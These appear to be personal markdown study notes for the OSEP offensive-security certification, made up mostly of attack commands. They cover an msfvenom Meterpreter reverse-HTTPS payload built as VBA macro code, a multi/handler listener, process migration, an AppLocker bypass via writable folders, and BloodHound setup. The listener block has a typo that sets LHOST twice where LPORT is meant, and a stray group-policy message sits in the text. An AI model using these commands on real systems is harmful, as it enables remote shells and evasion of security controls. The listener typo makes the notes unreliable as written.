# OSEP-Prep-Notes
OSEP Prep Notes



# Kali File Transfer Server

python -m uploadserver 8000

# RDP with xFreeRDP

xfreerdp /u:USERNAME /p:PASSWORD /w:1366 /h:768 /v:SERVER_IP

# VBA Application Script

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.xx.xx LPORT=443 EXITFUNC=thread -f vbapplication

# Listen With Meterpreter

```
msfconsole -q
use multi/handler
set payload windows/meterpreter/reverse_https
set LHOST OUR_KALI_IP
set LHOST 443
set EXITFUNC thread
run
```

# Post Exploitation - Migrate To Another Process

```
ps
> find a suitable process (like notepad.exe etc.)

migrate PID_OF_PROCESS
> the migration is success.

run post/windows/manage/migrate
> You should try this too.
```

# Post Exploitation - Find Readable and Writable Folders
This program is blocked by group policy. For more information, contact your system administrator.
```
accesschk.exe "PWNED_USERNAME" C:\Windows -wus
> Find a RW folder and use the folder for AppLocker Bypass.

or in "powershell -ep bypass"
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

# Post Exploitation - Find Executable in Folders:
```
icacls C:\Windows\Tasks
> Find a folder that you have the RX permission.
```

# Bloodhound - Init
```
neo4j console
> Open bloodhound app in Kali after the neo4j started.
>localhost:7474 neo4j:neo4j

```
